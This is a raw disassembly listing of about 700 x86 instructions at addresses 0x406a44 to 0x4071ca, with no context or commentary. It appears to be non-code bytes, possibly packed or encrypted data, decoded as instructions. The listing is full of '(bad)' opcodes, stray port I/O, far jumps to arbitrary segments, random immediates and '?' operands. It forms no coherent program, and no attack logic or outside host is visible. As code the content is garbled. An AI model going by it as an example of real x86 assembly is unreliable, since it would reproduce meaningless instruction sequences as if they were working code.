  406a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a45:	fisub  DWORD PTR [edx+eiz*1-0x6bc7e9c5]
  406a4c:	pop    esi
  406a4d:	(bad)  
  406a4e:	jo     0x406a0d
  406a50:	out    0x1a,eax
  406a52:	xchg   ebx,eax
  406a53:	pop    ebx
  406a54:	lods   eax,DWORD PTR ds:[esi]
  406a55:	xor    ebx,ebx
  406a57:	fistp  WORD PTR [ebx-0x69]
  406a5a:	retf   0xa38f
  406a5d:	mov    bh,dl
  406a5f:	mov    dh,0xeb
  406a61:	or     eax,0x8da82cd4
  406a66:	ret    0x8b8a
  406a69:	mov    ch,0xbc
  406a6b:	adc    al,0xaf
  406a6d:	mov    bh,0x52
  406a6f:	and    DWORD PTR [eax+0x25],edi
  406a72:	jle    0x406a25
  406a74:	test   al,0xb4
  406a76:	stc    
  406a77:	cmp    ebx,DWORD PTR [ecx]
  406a79:	jmp    0x406a64
  406a7b:	push   esp
  406a7c:	ret    
  406a7d:	repz mov edx,0x7be992df
  406a83:	add    eax,0xd7e3c9d4
  406a88:	xchg   esi,eax
  406a89:	lods   al,BYTE PTR ds:[esi]
  406a8a:	jle    0x406afe
  406a8c:	mov    al,0x13
  406a8e:	(bad)  
  406a8f:	pusha  
  406a90:	rol    DWORD PTR [eax+esi*8],cl
  406a93:	jmp    DWORD PTR [eax]
  406a95:	inc    esi
  406a96:	push   cs
  406a97:	dec    edx
  406a98:	js     0x406ad2
  406a9a:	xor    esi,DWORD PTR ds:0x1957be93
  406aa0:	(bad)  
  406aa1:	leave  
  406aa2:	add    dh,al
  406aa4:	inc    bp
  406aa6:	sub    al,al
  406aa8:	mov    WORD PTR [eax+0x62],ss
  406aab:	test   bl,al
  406aad:	out    0x8e,al
  406aaf:	pop    esi
  406ab0:	or     dl,ah
  406ab2:	repz les ecx,FWORD PTR [edx-0x6e]
  406ab6:	std    
  406ab7:	mov    al,ds:0x6890f00b
  406abc:	xchg   DWORD PTR [edi+0x111e4619],ebp
  406ac2:	fs retf 0xb49a
  406ac6:	push   ecx
  406ac7:	pop    ebp
  406ac8:	jl     0x406b02
  406aca:	jle    0x406afb
  406acc:	and    dh,BYTE PTR [ebp-0x7c151961]
  406ad2:	xchg   esi,eax
  406ad3:	pop    ds
  406ad4:	mov    ecx,0x6543f9fa
  406ad9:	ins    DWORD PTR es:[edi],dx
  406ada:	leave  
  406adb:	pop    ds
  406adc:	test   BYTE PTR [edi+0x2cf9c897],dl
  406ae2:	stos   DWORD PTR es:[edi],eax
  406ae3:	push   0x51a2022d
  406ae8:	dec    edi
  406ae9:	inc    edx
  406aea:	cmp    DWORD PTR [eax],ebx
  406aec:	or     eax,esp
  406aee:	js     0x406b20
  406af0:	popa   
  406af1:	clc    
  406af2:	push   es
  406af3:	fnstsw WORD PTR [ecx*1+0x2d8bbf5c]
  406afa:	rol    BYTE PTR [ebx+0x1d],0x4e
  406afe:	xor    bl,BYTE PTR [ecx+esi*2-0x492bb715]
  406b05:	xchg   ebx,eax
  406b06:	xor    al,0xa5
  406b08:	repz pop ecx
  406b0a:	dec    esp
  406b0b:	sub    ebx,esp
  406b0d:	push   0xffffff84
  406b0f:	mov    ecx,eax
  406b11:	push   cs
  406b12:	pop    ebp
  406b13:	pop    esi
  406b14:	jne    0x406b7e
  406b16:	push   eax
  406b17:	adc    al,0xf9
  406b19:	fadd   QWORD PTR [esi]
  406b1b:	mov    cl,bh
  406b1d:	int3   
  406b1e:	push   0x12a4636b
  406b23:	cmp    eax,0xa36941d9
  406b28:	sub    edx,esp
  406b2a:	das    
  406b2b:	addr16 cmc 
  406b2d:	fisub  WORD PTR [ebp-0x48]
  406b30:	or     al,0x50
  406b32:	xor    cl,dl
  406b34:	dec    ecx
  406b35:	pop    ebp
  406b36:	pop    es
  406b37:	lods   eax,DWORD PTR ds:[esi]
  406b38:	cmp    edx,0xffffffc9
  406b3b:	push   edi
  406b3c:	mov    dl,0x55
  406b3e:	(bad)  
  406b40:	push   ebp
  406b41:	ficomp WORD PTR [eax+0x7b9d6ee8]
  406b47:	clc    
  406b48:	xor    eax,eax
  406b4a:	xchg   BYTE PTR [ebx-0x1490d1f0],cl
  406b50:	xchg   DWORD PTR [edx+0x243c69a4],ebx
  406b56:	rcr    DWORD PTR [edx-0xb],0xa4
  406b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b5b:	leave  
  406b5c:	cmp    ebp,ecx
  406b5e:	fnstenv [esi-0x58e76cd0]
  406b64:	mov    cl,0x63
  406b66:	sbb    esi,DWORD PTR [si+0x76]
  406b6a:	out    dx,eax
  406b6b:	and    esi,DWORD PTR [ebx+0x1a]
  406b6e:	pop    ebx
  406b6f:	sti    
  406b70:	shl    BYTE PTR [edx-0x6e],0x44
  406b74:	test   BYTE PTR [eax],bh
  406b76:	sbb    esp,esi
  406b78:	int3   
  406b79:	dec    ebx
  406b7a:	adc    DWORD PTR [ecx-0x51],edx
  406b7d:	into   
  406b7e:	add    DWORD PTR [edi-0x5f],esp
  406b81:	add    eax,0xa2d3319c
  406b86:	ficomp DWORD PTR [ecx]
  406b88:	ins    BYTE PTR es:[edi],dx
  406b89:	loop   0x406bd3
  406b8b:	repz jo 0x406c01
  406b8e:	jo     0x406bd0
  406b90:	in     al,dx
  406b91:	push   ebx
  406b92:	sbb    DWORD PTR [edx],esp
  406b94:	enter  0x3b9e,0xb8
  406b98:	ins    BYTE PTR es:[edi],dx
  406b99:	xchg   edi,eax
  406b9a:	div    BYTE PTR [edi]
  406b9c:	add    DWORD PTR cs:0xabf4b948,ebp
  406ba3:	test   eax,0xf2221a13
  406ba8:	xchg   BYTE PTR [ecx+0x58606eda],dl
  406bae:	not    BYTE PTR [eax]
  406bb0:	push   ebx
  406bb1:	addr16 test dl,dh
  406bb4:	inc    esi
  406bb5:	sbb    bl,BYTE PTR [esi]
  406bb7:	xchg   edi,eax
  406bb8:	mov    al,0x32
  406bba:	loopne 0x406b83
  406bbc:	lea    eax,[edi+edx*1]
  406bbf:	pop    ds
  406bc0:	stos   DWORD PTR es:[edi],eax
  406bc1:	pop    ds
  406bc2:	int    0x64
  406bc4:	mov    bl,0xc7
  406bc6:	pop    ebx
  406bc7:	ds fwait
  406bc9:	pop    ds
  406bca:	dec    edx
  406bcb:	pop    esp
  406bcc:	add    eax,0x8e9daf02
  406bd1:	xor    edi,esp
  406bd3:	mov    gs,WORD PTR [eax]
  406bd5:	cdq    
  406bd6:	(bad)
  406bd9:	lea    ecx,[ebp+eax*4+0x5095534b]
  406be0:	dec    edx
  406be1:	(bad)  
  406be2:	mov    esp,esi
  406be4:	int3   
  406be5:	iret   
  406be6:	mov    dh,0x28
  406be8:	xchg   esp,eax
  406be9:	dec    ebp
  406bea:	mov    ds,WORD PTR [edx]
  406bec:	xchg   ecx,eax
  406bed:	scas   al,BYTE PTR es:[edi]
  406bee:	sub    BYTE PTR [ecx],ch
  406bf0:	jb     0x406bf3
  406bf2:	(bad)  
  406bf3:	shl    DWORD PTR [ebp+0x58b9811a],1
  406bf9:	inc    ecx
  406bfa:	add    eax,0x42d0e58a
  406bff:	or     DWORD PTR [ecx+0x6404a6b9],ebx
  406c05:	mov    edi,0x363a8e4b
  406c0a:	mov    ds:0x22ebde5c,al
  406c0f:	sti    
  406c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c11:	fdiv   QWORD PTR cs:[edx+0x37e1d513]
  406c18:	push   esi
  406c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c1a:	jg     0x406bc6
  406c1c:	jb     0x406c22
  406c1e:	cmp    DWORD PTR [edi-0x28b5affd],edi
  406c24:	mov    edx,0x124742a
  406c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c2a:	mov    BYTE PTR [ebp-0x2fa5e158],bl
  406c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c31:	mov    al,0x62
  406c33:	arpl   WORD PTR [edi+0xbe03701],sp
  406c39:	test   BYTE PTR [edi-0x5],bh
  406c3c:	sub    al,0x51
  406c3e:	fs gs mov esi,0x52210dc3
  406c45:	fwait
  406c46:	push   0x916974
  406c4b:	daa    
  406c4c:	adc    DWORD PTR [edi],ecx
  406c4e:	int    0xba
  406c50:	inc    esp
  406c51:	aaa    
  406c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c53:	push   esi
  406c54:	xor    eax,0x1c958cbf
  406c59:	mov    ds:0x8154ac19,al
  406c5e:	push   ebp
  406c5f:	pop    ebx
  406c60:	test   al,0xb0
  406c62:	out    dx,eax
  406c63:	push   0xc
  406c65:	outs   dx,BYTE PTR ds:[esi]
  406c66:	inc    edx
  406c67:	jg     0x406cc7
  406c69:	jmp    0x406c42
  406c6b:	mov    ah,0x75
  406c6d:	sbb    eax,0x640d125a
  406c72:	dec    ecx
  406c73:	mov    ecx,0x507623e7
  406c78:	push   0x9970e19c
  406c7d:	and    eax,0x6940ba79
  406c82:	mov    ecx,0x4b1f4d9f
  406c87:	mov    edx,0xee047771
  406c8c:	aam    0x21
  406c8e:	dec    esp
  406c8f:	in     eax,dx
  406c90:	mov    ecx,ss
  406c92:	pop    eax
  406c93:	xchg   ebx,eax
  406c94:	add    DWORD PTR [ecx-0x26],ebx
  406c97:	dec    ebx
  406c98:	test   DWORD PTR [esi-0x7d790b93],esi
  406c9e:	cwde   
  406c9f:	sbb    esi,DWORD PTR [ebp-0x5aecfa64]
  406ca5:	ss out 0x6d,al
  406ca8:	xchg   edi,eax
  406ca9:	jae    0x406c9b
  406cab:	lock dec edx
  406cad:	ss dec esi
  406caf:	fisub  DWORD PTR [esi]
  406cb1:	addr16 cmp al,0x24
  406cb4:	adc    bl,bl
  406cb6:	jbe    0x406ce1
  406cb8:	cld    
  406cb9:	xor    ecx,ecx
  406cbb:	(bad)  
  406cbc:	ins    BYTE PTR es:[edi],dx
  406cbd:	ret    
  406cbe:	test   al,0xb9
  406cc0:	jle    0x406c65
  406cc2:	xchg   esi,eax
  406cc3:	jmp    0xbe24:0x75769584
  406cca:	mov    esp,0xccac13ae
  406ccf:	sbb    BYTE PTR [ebx-0x4b5f9900],0x75
  406cd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cd7:	inc    esp
  406cd8:	sub    al,0xfe
  406cda:	cmp    al,0x5f
  406cdc:	lock mov edx,DWORD PTR [ebp+ebx*2-0x4d5b43c9]
  406ce4:	pop    es
  406ce5:	mov    WORD PTR [ebx-0x21],?
  406ce8:	add    bh,dl
  406cea:	test   DWORD PTR [edx-0xe],esp
  406ced:	fmul   st,st(7)
  406cef:	and    eax,0x7551d850
  406cf4:	jnp    0x406ce3
  406cf6:	push   eax
  406cf7:	neg    DWORD PTR [ebx]
  406cf9:	add    al,0x4b
  406cfb:	in     eax,0x8f
  406cfd:	outs   dx,BYTE PTR ds:[si]
  406cff:	inc    edx
  406d00:	lahf   
  406d01:	fisttp QWORD PTR [ecx+0x13dee8c7]
  406d07:	adc    DWORD PTR [ebp-0xe],0x16
  406d0b:	and    al,BYTE PTR [edi]
  406d0d:	jmp    0x102da820
  406d12:	push   ds
  406d13:	xchg   esi,eax
  406d14:	or     dh,BYTE PTR gs:[edi+esi*8]
  406d18:	int    0x64
  406d1a:	scas   al,BYTE PTR es:[edi]
  406d1b:	jo     0x406cbd
  406d1d:	idiv   BYTE PTR [ecx+0x3]
  406d20:	fucomip st,st(6)
  406d22:	adc    al,0x18
  406d24:	(bad)
  406d27:	jle    0x406d5c
  406d29:	xchg   ecx,eax
  406d2a:	xchg   ebp,eax
  406d2b:	or     BYTE PTR ds:0x3fbddc44,dl
  406d31:	mov    ?,WORD PTR [edi-0x638245d6]
  406d37:	mov    ch,0x3c
  406d39:	add    BYTE PTR [ebx+eax*4-0x704461ff],bl
  406d40:	xchg   ebx,eax
  406d41:	fs jne 0x406d7a
  406d44:	dec    esp
  406d45:	jns    0x406d19
  406d47:	adc    al,0x63
  406d49:	cwde   
  406d4a:	mov    ch,0xcf
  406d4c:	mov    eax,0x99bda319
  406d51:	push   ds
  406d52:	mov    esi,0xdde48a20
  406d57:	aad    0x74
  406d59:	repz mov al,BYTE PTR [ebx+0x42]
  406d5d:	add    bl,BYTE PTR [edx]
  406d5f:	mov    ecx,esp
  406d61:	mov    ecx,0x7d5e8b0b
  406d66:	push   ebx
  406d67:	cmp    eax,0x8f073ea
  406d6c:	and    dl,BYTE PTR [edi]
  406d6e:	adc    DWORD PTR [ecx],edi
  406d70:	or     ebp,ecx
  406d72:	xor    eax,0x4a65730
  406d77:	test   BYTE PTR [edi+0x72],cl
  406d7a:	mov    ecx,0x4298458c
  406d7f:	je     0x406d96
  406d81:	mov    edx,0xd7a666cf
  406d86:	xlat   BYTE PTR ds:[ebx]
  406d87:	xchg   edi,eax
  406d88:	outs   dx,BYTE PTR ds:[esi]
  406d89:	add    DWORD PTR [eax-0x77c0604],ecx
  406d8f:	popf   
  406d90:	sbb    DWORD PTR ds:0x6e6f7cd1,esp
  406d96:	pop    esi
  406d97:	xchg   edi,eax
  406d98:	mov    edi,0xd1ae629b
  406d9d:	sub    BYTE PTR [eax],cl
  406d9f:	jge    0x406e11
  406da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406da2:	stos   DWORD PTR es:[edi],eax
  406da3:	sbb    BYTE PTR [edx+0xc9a0bb9],ah
  406da9:	sbb    esi,DWORD PTR [ecx]
  406dab:	scas   eax,DWORD PTR es:[edi]
  406dac:	aas    
  406dad:	(bad)  
  406dae:	jl     0x406d90
  406db0:	cmp    ebp,eax
  406db2:	test   BYTE PTR [edx-0x14],ch
  406db5:	xor    al,0x5d
  406db7:	adc    dl,BYTE PTR [ebp+0xa]
  406dba:	mov    eax,ds:0x4930defb
  406dbf:	aaa    
  406dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dc1:	dec    ecx
  406dc2:	pop    esp
  406dc3:	call   0x94916203
  406dc8:	fimul  WORD PTR [ecx]
  406dca:	ja     0x406d67
  406dcc:	sahf   
  406dcd:	cmc    
  406dce:	or     BYTE PTR [edi+0x7097f1fb],al
  406dd4:	mov    ah,0xe5
  406dd6:	lea    ebp,[edx+0x58016f0]
  406ddc:	ja     0x406e1d
  406dde:	mov    ch,0xc9
  406de0:	lahf   
  406de1:	add    eax,0x904e3ba5
  406de6:	rcl    BYTE PTR ds:0x61e7e53,cl
  406dec:	cmc    
  406ded:	ja     0x406dd1
  406def:	fdivr  st,st(3)
  406df1:	pop    esi
  406df2:	jmp    0x406e73
  406df4:	(bad)  
  406df5:	and    eax,0xa0cbb428
  406dfa:	or     DWORD PTR [ecx],ecx
  406dfc:	sbb    ebp,ecx
  406dfe:	fidivr DWORD PTR [ebp-0xe]
  406e01:	mov    dh,0x66
  406e03:	loopne 0x406df6
  406e05:	mov    ds:0x8f074e1e,eax
  406e0a:	sahf   
  406e0b:	inc    esp
  406e0c:	mov    ah,BYTE PTR [ebp+0x46]
  406e0f:	add    al,0xc8
  406e11:	inc    edx
  406e12:	test   DWORD PTR [eax],edx
  406e14:	loope  0x406dc5
  406e16:	iret   
  406e17:	or     ch,BYTE PTR [ebx+0x7]
  406e1a:	adc    DWORD PTR [ebp-0x2c],0xffffff9b
  406e1e:	int3   
  406e1f:	ror    BYTE PTR [edx-0x18fb4d03],cl
  406e25:	(bad)  
  406e26:	cwde   
  406e27:	mov    cl,0xa
  406e29:	outs   dx,BYTE PTR ds:[esi]
  406e2a:	(bad)  
  406e2b:	mov    bh,0x6f
  406e2d:	dec    edi
  406e2e:	vpminsw ymm5,ymm0,YMMWORD PTR [ebx+eax*2+0x2bffddc3]
  406e37:	or     eax,0x96a68765
  406e3c:	xor    edx,ebx
  406e3e:	sbb    bl,BYTE PTR [ecx-0x18b1b4]
  406e44:	(bad)  
  406e46:	call   0xddb7d8f5
  406e4b:	xchg   ebx,eax
  406e4c:	add    BYTE PTR ds:0x4894f497,ah
  406e52:	les    ebx,FWORD PTR [ebp+0x49]
  406e55:	and    BYTE PTR [edi],ch
  406e57:	repz add BYTE PTR [ebx],0xf1
  406e5b:	mov    esp,0x52813f97
  406e60:	mov    ebp,edi
  406e62:	lds    edx,FWORD PTR fs:[ebx+0x5b]
  406e66:	call   0x6ab80cb5
  406e6b:	mov    eax,ds:0xf40edb27
  406e70:	repz push ds
  406e72:	test   al,0x9b
  406e74:	inc    edi
  406e75:	sbb    al,0x1f
  406e77:	pop    eax
  406e78:	out    0xd9,eax
  406e7a:	nop
  406e7b:	lock mov BYTE PTR [ebp+0x55e62608],bl
  406e82:	sti    
  406e83:	jnp    0x406e7f
  406e85:	daa    
  406e86:	xchg   DWORD PTR [ebx+0x30],esi
  406e89:	mov    esi,0xe1aebdd0
  406e8e:	shl    bh,0x72
  406e91:	xor    BYTE PTR [edx-0x6d],cl
  406e94:	mov    al,ds:0xa0a977b3
  406e99:	hlt    
  406e9a:	call   0xab60:0xad84da54
  406ea1:	pop    eax
  406ea2:	mov    ch,0x85
  406ea4:	sar    BYTE PTR [ebx+0x14],1
  406ea7:	mov    cl,0xa5
  406ea9:	or     BYTE PTR gs:[edi+eiz*4],ch
  406ead:	inc    esi
  406eae:	cmp    DWORD PTR [eax+0x3d6a4388],edi
  406eb4:	ja     0x406ee8
  406eb6:	in     al,dx
  406eb7:	clc    
  406eb8:	(bad)  
  406eb9:	popa   
  406eba:	mov    al,0x85
  406ebc:	sbb    eax,0xd4c7d1eb
  406ec1:	sub    ebp,DWORD PTR [edi]
  406ec3:	aam    0x3
  406ec5:	(bad)  [esi+0x97332c1]
  406ecb:	cs mov eax,0xa674c1a4
  406ed1:	inc    esp
  406ed2:	sbb    DWORD PTR [ebx-0x4e],ecx
  406ed5:	jbe    0x406ea5
  406ed7:	test   esi,edi
  406ed9:	jae    0x406f4a
  406edb:	inc    eax
  406edc:	mov    DWORD PTR [eax+ebp*1+0x73],0x86c21372
  406ee4:	fwait
  406ee5:	jae    0x406f0e
  406ee7:	fsub   st,st(0)
  406ee9:	(bad)  
  406eea:	adc    BYTE PTR [ebx-0x786cf738],0x28
  406ef1:	cdq    
  406ef2:	push   esi
  406ef3:	outs   dx,DWORD PTR ds:[esi]
  406ef4:	shl    DWORD PTR [ebp+0x8],1
  406ef7:	call   0x5fc2cbea
  406efc:	std    
  406efd:	rcr    edx,1
  406eff:	punpckhwd mm1,QWORD PTR ds:0x1853b510
  406f06:	jl     0x406f36
  406f08:	cmc    
  406f09:	xchg   edx,eax
  406f0a:	xchg   ebp,eax
  406f0b:	cmp    DWORD PTR [eax],ebp
  406f0d:	jmp    0xee642262
  406f12:	mov    cl,dl
  406f14:	les    esi,FWORD PTR [ecx+0x5d]
  406f17:	xor    dh,BYTE PTR [edx-0x3b]
  406f1a:	mov    al,0x99
  406f1c:	xor    BYTE PTR [edi-0x43aa82e9],bh
  406f22:	sbb    al,0x3b
  406f24:	xchg   esi,eax
  406f25:	xlat   BYTE PTR ds:[ebx]
  406f26:	adc    eax,0xefce06b1
  406f2b:	xlat   BYTE PTR ds:[ebx]
  406f2c:	mov    ch,0xc3
  406f2e:	rcr    edx,1
  406f30:	or     bl,BYTE PTR [ecx+0x50]
  406f33:	mov    eax,0x3587e32e
  406f38:	repz pop ds
  406f3a:	xlat   BYTE PTR ds:[ebx]
  406f3b:	mov    al,ds:0xb54abd52
  406f40:	mov    eax,0xbaca4c28
  406f45:	mov    al,ds:0xc44317c8
  406f4a:	jl     0x406edb
  406f4c:	sbb    al,0xc2
  406f4e:	mov    edx,0xe8f34754
  406f53:	xchg   ebp,eax
  406f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f55:	outs   dx,DWORD PTR ds:[esi]
  406f56:	pop    ecx
  406f57:	in     al,dx
  406f58:	xchg   ebx,eax
  406f59:	jge    0x406fb5
  406f5b:	adc    ecx,eax
  406f5d:	int3   
  406f5e:	lea    ebx,[ebx+0x7c626340]
  406f64:	sbb    BYTE PTR [ecx+0x58],dh
  406f67:	push   edx
  406f68:	pushf  
  406f69:	dec    edx
  406f6a:	pop    ss
  406f6b:	jns    0x406f08
  406f6d:	adc    eax,0x38255bfb
  406f72:	out    0xfa,eax
  406f74:	mov    cl,al
  406f76:	js     0x406f1b
  406f78:	push   esp
  406f79:	lahf   
  406f7a:	xchg   BYTE PTR [ebx],ah
  406f7c:	(bad)  
  406f7d:	(bad)  
  406f7e:	int3   
  406f7f:	sub    ebx,edx
  406f81:	int    0x4e
  406f83:	popa   
  406f84:	pop    esi
  406f85:	xchg   edi,eax
  406f86:	add    eax,DWORD PTR ds:0x1f0b1cfc
  406f8c:	sbb    al,0x14
  406f8e:	cmp    eax,0xd40c172e
  406f93:	stc    
  406f94:	in     al,0xd3
  406f96:	lock adc dl,BYTE PTR [ebp+0x13]
  406f9a:	add    ebx,esp
  406f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f9d:	ss stos DWORD PTR es:[edi],eax
  406f9f:	lahf   
  406fa0:	and    al,0x81
  406fa2:	add    BYTE PTR [edx+esi*1],ch
  406fa5:	outs   dx,BYTE PTR ds:[esi]
  406fa6:	js     0x406ff9
  406fa8:	xchg   ebp,eax
  406fa9:	aad    0x79
  406fab:	clc    
  406fac:	add    edx,DWORD PTR [edx-0x74]
  406faf:	inc    eax
  406fb0:	pushf  
  406fb1:	sbb    al,0xb5
  406fb3:	mov    eax,ds:0x5f26e813
  406fb8:	push   es
  406fb9:	repnz and BYTE PTR [ecx+0x40],cl
  406fbd:	popa   
  406fbe:	push   edx
  406fbf:	les    esp,FWORD PTR [esi]
  406fc1:	lock jge 0x406feb
  406fc4:	adc    BYTE PTR [edx],dl
  406fc6:	adc    eax,0x987171b4
  406fcb:	sub    eax,0xb042dc8a
  406fd0:	push   esp
  406fd1:	jp     0x406fec
  406fd3:	jecxz  0x406f82
  406fd5:	and    esp,DWORD PTR [ebx+ebp*4-0x37]
  406fd9:	rol    eax,cl
  406fdb:	aad    0xbb
  406fdd:	inc    edx
  406fde:	jle    0x40705a
  406fe0:	xchg   ecx,eax
  406fe1:	mov    bh,0xad
  406fe3:	outs   dx,BYTE PTR fs:[esi]
  406fe5:	sbb    eax,0x51132cb6
  406fea:	(bad)  
  406feb:	jmp    0xa227:0x863fca31
  406ff2:	and    al,0xc0
  406ff4:	and    dl,BYTE PTR [ecx-0x1b]
  406ff7:	(bad)  
  406ff8:	test   DWORD PTR [edi-0x31],0x9bd4be3
  406fff:	push   edi
  407000:	pop    ebp
  407001:	stos   BYTE PTR es:[edi],al
  407002:	jbe    0x406fd0
  407004:	dec    ebp
  407005:	push   ebx
  407006:	and    edx,ebp
  407008:	and    eax,0xbefb6a90
  40700d:	cwde   
  40700e:	js     0x406ff0
  407010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407011:	mov    dl,BYTE PTR [esp+edx*2+0x28]
  407015:	(bad)  
  407016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407017:	mov    fs,WORD PTR [edx+0x12]
  40701a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40701b:	mov    bh,0xe0
  40701d:	sbb    ebx,edx
  40701f:	and    al,0xcb
  407021:	std    
  407022:	push   edx
  407023:	lods   al,BYTE PTR ds:[esi]
  407024:	jmp    0x406fcc
  407026:	imul   ecx,DWORD PTR [esi-0x21],0xb7ad258
  40702d:	fcom   DWORD PTR [ebp+0xce2abf1]
  407033:	jne    0x407047
  407035:	mov    esp,ds
  407037:	mov    eax,DWORD PTR [esi-0x72]
  40703a:	adc    ebx,eax
  40703c:	arpl   WORD PTR [edx],bp
  40703e:	dec    edx
  40703f:	push   eax
  407040:	push   ebx
  407041:	adc    eax,0xe3cb8561
  407046:	add    al,0x5d
  407048:	or     ecx,ecx
  40704a:	sbb    eax,0x1e68335c
  40704f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407050:	pop    ebx
  407051:	stos   DWORD PTR es:[edi],eax
  407052:	xor    ecx,DWORD PTR ds:0x187796d
  407058:	xchg   ebp,eax
  407059:	mov    ds:0xbc08d363,al
  40705e:	sbb    ecx,0x78
  407061:	or     esp,ebx
  407063:	push   ecx
  407064:	add    ebp,DWORD PTR [ebp-0x3a6c6822]
  40706a:	jmp    0x575e2e18
  40706f:	mov    al,0x8a
  407071:	push   esi
  407072:	push   ds
  407073:	ins    DWORD PTR es:[edi],dx
  407074:	xor    eax,0x65ee76a
  407079:	stos   DWORD PTR es:[edi],eax
  40707a:	xchg   ebx,eax
  40707b:	pop    ds
  40707c:	mov    bl,0x11
  40707e:	lock xlat BYTE PTR ds:[ebx]
  407080:	bound  ebx,QWORD PTR [ebx+eax*4+0x7b]
  407084:	dec    ebp
  407085:	das    
  407086:	mov    esp,0x276e2c21
  40708b:	or     DWORD PTR [si],ecx
  40708e:	ret    0x2df6
  407091:	(bad)  
  407092:	jo     0x4070ca
  407094:	fs movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  407097:	push   edi
  407098:	sbb    al,0x5e
  40709a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40709b:	cmp    BYTE PTR [ebp-0x1a],cl
  40709e:	pop    ebp
  40709f:	and    eax,0x57017a73
  4070a4:	jmp    0x407054
  4070a6:	add    al,bl
  4070a8:	push   eax
  4070a9:	bound  ebp,QWORD PTR [ebp-0x806d386]
  4070af:	dec    esp
  4070b0:	(bad)  
  4070b1:	out    dx,eax
  4070b2:	lea    ebx,[esp+ecx*8-0x29777f6f]
  4070b9:	pop    esp
  4070ba:	retf   0xf98d
  4070bd:	pop    ebp
  4070be:	cmc    
  4070bf:	dec    edi
  4070c0:	push   esi
  4070c1:	lods   al,BYTE PTR ds:[esi]
  4070c2:	add    dh,ah
  4070c4:	cs stos DWORD PTR es:[edi],eax
  4070c6:	stos   BYTE PTR es:[edi],al
  4070c7:	xchg   esi,eax
  4070c8:	imul   BYTE PTR [edx]
  4070ca:	adc    ch,BYTE PTR gs:[edi+edx*1+0x3c]
  4070cf:	push   0x5a
  4070d1:	mov    WORD PTR [ebp+eax*4-0xe897501],gs
  4070d8:	push   esi
  4070d9:	daa    
  4070da:	rep outs dx,BYTE PTR ss:[esi]
  4070dd:	add    esi,ebp
  4070df:	push   esp
  4070e0:	pusha  
  4070e1:	and    DWORD PTR [edi-0x5c],edx
  4070e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e5:	cmp    al,0xb8
  4070e7:	mov    edi,0x35df2a77
  4070ec:	and    al,0xb3
  4070ee:	scas   eax,DWORD PTR es:[edi]
  4070ef:	arpl   WORD PTR [ecx],dx
  4070f1:	outs   dx,DWORD PTR ds:[esi]
  4070f2:	ror    BYTE PTR [ebp+0x4d2582a2],cl
  4070f8:	aaa    
  4070f9:	and    DWORD PTR [edi-0x45],ebx
  4070fc:	out    dx,al
  4070fd:	ror    DWORD PTR [ebp+0x62552a92],1
  407103:	rcl    DWORD PTR [esi-0x635194a2],0xb8
  40710a:	mov    cl,0x5b
  40710c:	jg     0x4070df
  40710e:	mov    esp,0xdfb347c6
  407113:	mov    ebp,0xaa7d73cd
  407118:	stc    
  407119:	in     eax,0x12
  40711b:	aad    0x6
  40711d:	xlat   BYTE PTR ds:[ebx]
  40711e:	push   0xdd16f053
  407123:	cmp    edx,0xffffffd0
  407126:	sti    
  407127:	fdiv   QWORD PTR [edx+ebx*8-0x76d5dbef]
  40712e:	inc    esi
  40712f:	add    ebp,DWORD PTR [esi+0x6]
  407132:	push   cs
  407133:	xchg   esp,eax
  407134:	sahf   
  407135:	jle    0x40713b
  407137:	(bad)  
  407138:	pop    esp
  407139:	pop    ds
  40713a:	inc    ebp
  40713b:	daa    
  40713c:	jbe    0x4070d0
  40713e:	jo     0x4071a1
  407140:	or     al,0x5c
  407142:	pushf  
  407143:	jmp    FWORD PTR [edi]
  407145:	dec    edx
  407146:	mov    BYTE PTR [edx],0x66
  407149:	es push 0x1a248de9
  40714f:	jo     0x4070e5
  407151:	pop    es
  407152:	ffree  st(3)
  407154:	jmp    DWORD PTR [ecx+0x16bbc71f]
  40715a:	inc    ebp
  40715b:	mov    esi,0xddff7d3c
  407160:	les    ebx,FWORD PTR [edx-0x1f]
  407163:	xor    DWORD PTR [ebp+eiz*4+0x528abf2c],edi
  40716a:	jmp    0xf54e:0x168c2f9a
  407171:	push   ebx
  407172:	adc    al,0x90
  407174:	pop    edi
  407175:	arpl   WORD PTR [ebp-0x5ff24d72],si
  40717b:	jp     0x407158
  40717d:	dec    ebx
  40717e:	jle    0x407178
  407180:	and    bh,BYTE PTR [esp+ebp*1]
  407183:	shr    edi,cl
  407185:	movaps xmm0,XMMWORD PTR [ecx-0x46]
  407189:	jns    0x4071e4
  40718b:	repnz lahf 
  40718d:	jae    0x40712d
  40718f:	sbb    ch,al
  407191:	fcomp  DWORD PTR [ebx-0x402dcf2a]
  407197:	call   0xac06:0x724a897b
  40719e:	addr16 xor al,0xcf
  4071a1:	(bad)  
  4071a2:	icebp  
  4071a3:	cmp    eax,0x9acaa8f2
  4071a8:	mov    bh,0xb9
  4071aa:	mov    ds:0x54eaf00a,al
  4071af:	rcr    ebp,0xbf
  4071b2:	xor    BYTE PTR [edi],al
  4071b4:	sbb    al,0xb5
  4071b6:	loopne 0x40713c
  4071b8:	sahf   
  4071b9:	in     eax,0xe6
  4071bb:	and    eax,0x7e81fb9
  4071c0:	out    dx,eax
  4071c1:	aaa    
  4071c2:	mov    al,0x50
  4071c4:	or     edi,DWORD PTR [edx]
  4071c6:	mov    dl,0x2f
  4071c8:	xor    ecx,edx
  4071ca:	pop    esp
